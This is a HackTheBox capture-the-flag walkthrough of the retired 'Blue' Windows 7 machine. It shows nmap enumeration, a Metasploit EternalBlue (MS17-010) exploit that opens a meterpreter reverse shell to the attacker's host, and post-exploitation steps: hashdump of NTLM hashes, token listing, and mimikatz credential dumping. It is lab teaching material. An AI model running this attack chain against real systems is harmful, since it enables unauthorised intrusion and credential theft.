---
layout: post
title: HackTheBox - Blue (Retired)
---

## Enumeration

```
root@kali:~/Security/HackTheBox/blue# portscan 10.10.10.40
Open ports: 135,139,445,49152,49153,49154,49155,49156,49157
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 15:36 EDT
Nmap scan report for blue.htb (10.10.10.40)
Host is up (0.074s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -18m49s, deviation: 34m35s, median: 1m08s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-01T20:39:06+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-01T19:39:04
|_  start_date: 2020-09-01T12:51:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.31 seconds
```

Let's check specifically for MS17-010:
```
root@kali:~/Security/HackTheBox/blue# nmap -Pn -p445 --script=smb-vuln-ms17-010 blue.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 15:39 EDT
Nmap scan report for blue.htb (10.10.10.40)
Host is up (0.074s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
```
## Gaining Access
Check Metasploit for eternalblue:
```
msf5 > search ms17-010
...
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS blue.htb
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
...
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
C:\Windows\system32>whoami
whoami
nt authority\system
```
We get a root shell, but let's use a meterpreter payload instead.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > show payloads
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/
set payload windows/x64/meterpreter/bind_ipv6_tcp       set payload windows/x64/meterpreter/reverse_https
set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid  set payload windows/x64/meterpreter/reverse_named_pipe
set payload windows/x64/meterpreter/bind_named_pipe     set payload windows/x64/meterpreter/reverse_tcp
set payload windows/x64/meterpreter/bind_tcp            set payload windows/x64/meterpreter/reverse_tcp_rc4
set payload windows/x64/meterpreter/bind_tcp_rc4        set payload windows/x64/meterpreter/reverse_tcp_uuid
set payload windows/x64/meterpreter/bind_tcp_uuid       set payload windows/x64/meterpreter/reverse_winhttp
set payload windows/x64/meterpreter/reverse_http        set payload windows/x64/meterpreter/reverse_winhttps

msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp

msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.66      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

...
[*] Meterpreter session 2 opened (10.10.14.66:4444 -> 10.10.10.40:49160) at 2020-09-01 15:50:07 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6::

c:\Users\Administrator>arp -a
arp -a

Interface: 10.10.10.40 --- 0xb
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-aa-a3     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static 

c:\Users\Administrator>route print
route print
===========================================================================
Interface List
 11...00 50 56 b9 a3 49 ......Intel(R) PRO/1000 MT Network Connection
  1...........................Software Loopback Interface 1
 12...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
 13...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2      10.10.10.40    266
       10.10.10.0    255.255.255.0         On-link       10.10.10.40    266
      10.10.10.40  255.255.255.255         On-link       10.10.10.40    266
     10.10.10.255  255.255.255.255         On-link       10.10.10.40    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link       10.10.10.40    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link       10.10.10.40    266
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
 11    266 ::/0                     fe80::250:56ff:feb9:aaa3
  1    306 ::1/128                  On-link
 11     18 dead:beef::/64           On-link
 11    266 dead:beef::dc8d:a296:105:bbd9/128
                                    On-link
 11    266 dead:beef::f4b1:b7a1:cfed:2fad/128
                                    On-link
 11    266 fe80::/64                On-link
 11    266 fe80::dc8d:a296:105:bbd9/128
                                    On-link
  1    306 ff00::/8                 On-link
 11    266 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```
If this PC had two NICs and was sitting on two different networks (dual-homed), we could pivot.
```
c:\Users\Administrator>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       408
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       820
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       1756
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       536
  TCP    10.10.10.40:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.40:49159      10.10.14.66:4444       CLOSE_WAIT      1080
  TCP    10.10.10.40:49160      10.10.14.66:4444       ESTABLISHED     1080
  TCP    [::]:135               [::]:0                 LISTENING       732
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       408
  TCP    [::]:49153             [::]:0                 LISTENING       820
  TCP    [::]:49154             [::]:0                 LISTENING       916
  TCP    [::]:49155             [::]:0                 LISTENING       520
  TCP    [::]:49156             [::]:0                 LISTENING       1756
  TCP    [::]:49157             [::]:0                 LISTENING       536
  UDP    0.0.0.0:500            *:*                                    916
  UDP    0.0.0.0:4500           *:*                                    916
  UDP    0.0.0.0:5355           *:*                                    540
  UDP    10.10.10.40:137        *:*                                    4
  UDP    10.10.10.40:138        *:*                                    4
  UDP    [::]:500               *:*                                    916
  UDP    [::]:4500              *:*                                    916
  UDP    [::]:5355              *:*                                    540

```
We can load extra modules. No domain account to log into though.
```
c:\Users\Administrator>^C
Terminate channel 1? [y/N]  y
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```
If we are using x64 architecture we can use kiwi.
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
wdigest credentials
===================

Username   Domain     Password
--------   ------     --------
(null)     (null)     (null)
HARIS-PC$  WORKGROUP  (null)

kerberos credentials
====================

Username   Domain     Password
--------   ------     --------
(null)     (null)     (null)
haris-pc$  WORKGROUP  (null)

meterpreter > wifi_list

[-] No wireless profiles found on the target.
```
Mimikatz is 32 bit and kiwi is 64 bit. 

Anyway, onto the user and root flags.
```
meterpreter > cat c:/users/haris/desktop/user.txt
{censored}
meterpreter > cat c:/users/Administrator/Desktop/root.txt
{censored}
```
